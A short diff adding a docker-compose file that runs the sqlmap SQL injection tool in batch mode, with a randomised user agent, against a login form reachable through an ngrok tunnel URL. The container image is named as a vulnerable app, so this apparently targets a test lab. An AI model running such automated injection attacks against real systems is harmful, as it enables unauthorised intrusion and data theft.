@@ -1,0 +1,8 @@
+version: '3'
+services:
+  sqlmap:
+    image: marsko/vulnerable-app:latest
+    volumes:
+      - ./sqlmap-output:/root/.local/share/sqlmap/output
+    entrypoint: >
+      sqlmap -u https://c16f-2a02-85f-9a07-c918-4df0-638e-6aac-7ed4.ngrok-free.app/login --data="username=test&password=test" --batch --random-agent
